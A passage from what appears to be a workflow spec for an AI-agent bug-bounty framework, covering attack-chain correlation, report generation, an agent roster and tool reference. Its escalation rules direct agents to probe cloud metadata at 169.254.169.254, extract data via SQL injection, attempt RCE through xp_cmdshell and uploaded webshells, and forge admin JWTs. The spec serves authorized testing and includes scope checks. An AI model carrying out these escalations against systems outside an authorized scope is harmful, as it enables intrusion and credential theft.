   - Data-breach chain: IDOR (P6.1) + weak object IDs + missing rate-limit (P10.5)
   - RCE chain:         SSRF (P9.1) -> internal service / metadata -> cloud creds
   - RCE chain:         file upload (P10.9) or LFI (P6.4) -> webshell
   - Mass-XSS chain:    cache poisoning (P9.2) + reflected XSS (P8.1)
  Map each chain to MITRE ATT&CK; assign elevated combined CVSS.
  Output -> $FINDINGS_DIR/attack-chains.json
```
- **Dispatch:** -> ExploitChainAgent

### 12.4 Generate report, record findings, notify

```bash
# Record each validated finding into the orchestrator state machine
jq -c '.[]' "$FINDINGS_DIR/final-findings.json" | while read -r f; do
  bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --add-finding "$f"
done

# Professional report from the validated findings + chains
bun ~/.claude/skills/BugBountyFramework/Tools/generate-report.ts \
  --findings "$FINDINGS_DIR/final-findings.json" --chains "$FINDINGS_DIR/attack-chains.json" \
  --template ~/.claude/skills/BugBountyFramework/Templates/BugReport.md \
  --target "$TARGET" --program "$PROGRAM_NAME" --mode "$HUNT_MODE" \
  --output "$RUN_DIR/report-$(date +%Y%m%d).md" 2>/dev/null || echo "[WARN] report tool unavailable; final-findings.json is the deliverable"

# Archive evidence and redact secrets from every artifact before sharing
tar -czf "$RUN_DIR/evidence-$(date +%Y%m%d).tar.gz" "$FINDINGS_DIR" "$EVIDENCE_DIR" "$ARTIFACTS_DIR" 2>/dev/null
bun "$TOOLS/credential-vault.ts" --redact --file "$RUN_DIR/report-$(date +%Y%m%d).md" 2>/dev/null

bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

### 12.5 Concise N-point update of new tests performed

For a fast stakeholder update, emit one bullet per technique class actually exercised this run (eight-word bullets), e.g.:

```bash
jq -r '[.[].type] | unique | .[] | "- tested " + .' "$FINDINGS_DIR/all-findings-raw.json" \
  | head -24 > "$RUN_DIR/update-points.md"
cat "$RUN_DIR/update-points.md"
```

A representative N-point update reads: recon + authenticated profiling; config/backup/source exposure; TLS + crypto; identity + auth (enum, default creds, reset, MFA); OAuth redirect/state/code; session (fixation, JWT, logout); access control (IDOR/BFLA/privesc, traversal); server-side injection (SQLi/NoSQLi/XXE/SSTI/cmd/deser/CRLF); client-side (XSS/CORS/CSRF/clickjacking/PP/postMessage); SSRF + cache + smuggling + takeover + host-header; business logic + races + uploads; API/GraphQL/WebSocket; then validation, de-dup, CVSS, and chaining.

### Phase 12 artifacts
`$FINDINGS_DIR/{all-findings-raw.json,validated.json,gated.json,final-findings.json,attack-chains.json}`, `$RUN_DIR/{report-*.md,evidence-*.tar.gz,update-points.md}`.

### Phase 12 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| All findings reproduced | every reported issue re-fired | Required |
| De-duplicated by root cause | no duplicate root causes | Required |
| CVSS scored | vector string per finding | Required |
| Chains correlated | mediums checked for chain potential | Required |
| Report + evidence + redaction | produced and secrets stripped | Required |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance   # -> REPORT complete
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --status
```

---

## Workflow Execution Summary

### Phase dependency graph

```
Pre-Flight (proxy, scope, identities)
  |
  v
P1 RECON --> P2 PROFILING (blocks all hunters; emits AppProfile)
  |
  +-- P3 CONFIG/DEPLOY/CRYPTO (AppReviewAgent, SecretsExposureAgent)
  +-- P4 IDENTITY/AUTH (AuthAgent, OAuthAgent) --+ blocks P5,P6 (identity model)
  +-- P5 SESSION (AuthAgent) <-------------------+
  +-- P6 AUTHZ/ACCESS CONTROL (IDORAgent, PathTraversalAgent) <-- needs identities
  |
  v  (HUNT groups -- parallel, orchestrator caps concurrency at --max-parallel)
P7 SERVER-SIDE INJECTION   [SQLi,NoSQLi,XXE,RCE,SSTI,CommandInjection,Deserialization,CRLF]
P8 CLIENT-SIDE             [XSS,CORS,PrototypePollution,OpenRedirect,WebSocket,CSRF]
P9 REQ/RESP & INFRA        [SSRF,CachePoisoning,HTTPSmuggling,SubdomainTakeover,CRLF]
P10 BUSINESS LOGIC         [BusinessLogic,RaceCondition,FileUpload]
P11 API & PROTOCOL         [GraphQL,WebSocket,API] (conditional)
  |
  v
P12 VALIDATE (ValidatorAgent) --> CHAIN (ExploitChainAgent) --> REPORT
```

### Full agent roster (engagement `web`, agent-router order)

| Group | Agent | Phase(s) | Required |
|-------|-------|----------|----------|
| RECON | ReconAgent | P1 | Yes |
| UNDERSTAND | AppReviewAgent | P2, P3 | Yes |
| CONFIG | SecretsExposureAgent | P1.5/1.7, P3 | Yes |
| AUTH | AuthAgent | P4, P5 | Yes |
| AUTH | OAuthAgent | P4.14 | If OAuth |
| AUTHZ | IDORAgent | P6 | Yes |
| AUTHZ | PathTraversalAgent | P6.4 | Yes |
| HUNT | SQLiAgent | P7.1/7.3 | Yes |
| HUNT | NoSQLiAgent | P7.2 | Yes |
| HUNT | XXEAgent | P7.4 | If XML |
| HUNT | SSTIAgent | P7.5/7.12 | Yes |
| HUNT | CommandInjectionAgent | P7.6/7.8/7.9 | Yes |
| HUNT | RCEAgent | P7.7/7.10/7.11 | Yes |
| HUNT | DeserializationAgent | P7.13 | If serialized |
| HUNT | CRLFAgent | P7.14, P9.5 | Yes |
| HUNT | XSSAgent | P8.1/8.2/8.3/8.6/8.12/8.13 | Yes |
| HUNT | CORSAgent | P3.7, P8.8 | Yes |
| HUNT | OpenRedirectAgent | P8.4 | Yes |
| HUNT | PrototypePollutionAgent | P8.7/8.14 | If Node.js |
| HUNT | CSRFAgent | P8.5/8.10 | Yes |
| HUNT | SSRFAgent | P9.1 | Yes |
| HUNT | CachePoisoningAgent | P9.2 | If CDN |
| HUNT | HTTPSmugglingAgent | P9.3 | If reverse proxy |
| HUNT | SubdomainTakeoverAgent | P9.4 | Yes |
| HUNT | BusinessLogicAgent | P10.1-10.7 | Yes |
| HUNT | RaceConditionAgent | P10.4/10.5 | Yes |
| HUNT | FileUploadAgent | P10.8/10.9 | If upload |
| HUNT | GraphQLAgent | P11.1 | If GraphQL |
| HUNT | WebSocketAgent | P8.11, P11.2 | If WS |
| HUNT | APIAgent | P2.7, P11.3 | If API |
| VALIDATE | ValidatorAgent | P12.2 | Yes |
| CHAIN | ExploitChainAgent | P12.3 | Yes |

### Finding-triggered escalation rules

| Finding | Escalation |
|---------|------------|
| IDOR confirmed | Sweep privilege escalation across ALL endpoints with the identity matrix |
| SSRF confirmed | Immediately test cloud metadata (169.254.169.254 + IMDSv2) and internal port scan |
| Stored XSS confirmed | Test admin-panel impact; chain to ATO payloads (P12.3) |
| Auth bypass confirmed | Re-test every endpoint for missing authorization (P6) |
| SQLi confirmed | Attempt data extraction; test RCE (`xp_cmdshell`/`INTO OUTFILE`) |
| File upload bypass | Test RCE via uploaded webshell (P10.9) |
| JWT none/confusion works | Forge admin token; replay across all admin endpoints |
| Race confirmed | Test all financial/limit endpoints for double-spend |
| Cache poisoning confirmed | Test stored-XSS-via-cache + cache deception for data theft |
| Prototype pollution confirmed | Test template-gadget RCE (EJS/Pug/Handlebars) |
| Host-header reflected | Test reset-link poisoning (P4.11) and cache poisoning (P9.2) |

### Error handling and recovery

| Error | Action |
|-------|--------|
| Agent timeout | Kill agent, log partial results, continue; note gap in report |
| Auth session expired mid-phase | `auth-manager --refresh`, retry phase |
| Burp proxy unreachable | WARN, continue with degraded evidence (no history capture) |
| Target 503/429 (rate limited) | Back off 60s, reduce concurrency, retry |
| Agent crash | Log error, write empty findings file, continue |
| Phase gate hard-fail | `hunt-orchestrator --fail`, note gap, proceed where safe |

### Tool reference

| Tool | Invocation | Purpose |
|------|-----------|---------|
| hunt-orchestrator.ts | `bun $TOOLS/hunt-orchestrator.ts --target U --mode M / --advance / --add-finding / --status / --fail` | Phase state machine, finding registry |
| agent-router.ts | `bun $TOOLS/agent-router.ts --engagement web [--json] [--max-parallel N]` | Canonical deployment plan |
| credential-vault.ts | `bun $TOOLS/credential-vault.ts --store/--get/--list/--redact` | Multi-identity creds; secret redaction |
| auth-manager.ts | `bun $TOOLS/auth-manager.ts --target U --authenticate/--check/--refresh --save-state` | Auth flows, session persistence |
| burp-bridge.ts | `bun $TOOLS/burp-bridge.ts --health/--sync-scope/--history/--export-har/--collaborator-poll` | Burp REST: scope, history, OOB |
| playwright-harness.ts | `bun $TOOLS/playwright-harness.ts --mode map-flows|test --test-xss ...` | Real-browser dynamic testing |
| subfinder/amass/httpx/katana/ffuf/arjun | recon binaries | Surface enumeration |
| sqlmap/dalfox/nuclei/jwt_tool/ysoserial/smuggler/subjack | exploitation binaries | Per-class automation |
| `piranha tools web` | surfaces per-domain tooling | Confirm installed tooling before a run |

---

## Appendix A: Environment variables

```bash
# Required
TARGET="https://app.example.com"; TARGET_DOMAIN="example.com"; TARGET_SLUG="app-example-com"
HUNT_MODE="bounty"   # bounty | pentest | comprehensive
PROGRAM_NAME="HackerOne - ExampleCorp"
# Proxy / identity
BURP_PROXY="http://127.0.0.1:8080"; BURP_API="http://127.0.0.1:1337/v0.1"
UA="Mozilla/5.0 ... Chrome/124.0.0.0 Safari/537.36"; COLLAB="<collaborator-or-interactsh-host>"
# Identities (vault-keyed; cookies materialized in Pre-Flight)
COOKIE_A; COOKIE_B; COOKIE_ADMIN; KNOWN_VALID_USER
# Paths (match hunt-orchestrator.ts session layout)
TOOLS=~/.claude/skills/BugBountyFramework/Tools
RUN_DIR=~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}
FINDINGS_DIR=$RUN_DIR/findings; EVIDENCE_DIR=$RUN_DIR/screenshots
ARTIFACTS_DIR=$RUN_DIR/artifacts; RECON_DIR=$RUN_DIR/recon
```

## Appendix B: Minimum viable run (30-60 min)

1. Pre-Flight (proxy, scope, userA+userB).
2. P1 Recon -- seed host only (skip full subdomain enum).
3. P2 Profiling -- full AppProfile.
4. P4 Auth -- enumeration, default creds, JWT, reset.
5. P6 Access control -- IDOR (two-account) + BFLA.
6. P7/P8 -- SQLi + XSS only.
7. P12 -- validate, score, report.

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --mode bounty
```

## Appendix C: Scope awareness (mandatory for every agent)

Every agent MUST call `in_scope` (Pre-Flight PF.4) before testing ANY discovered asset:

```bash
in_scope "$DISCOVERED_URL" || { echo "skip (out of scope)"; continue; }
```

Third-party services, CDNs, and shared infrastructure are ALWAYS out of scope unless explicitly listed. Out-of-scope assets are logged to `$RUN_DIR/out-of-scope.log` and never probed. When in doubt, do not test.
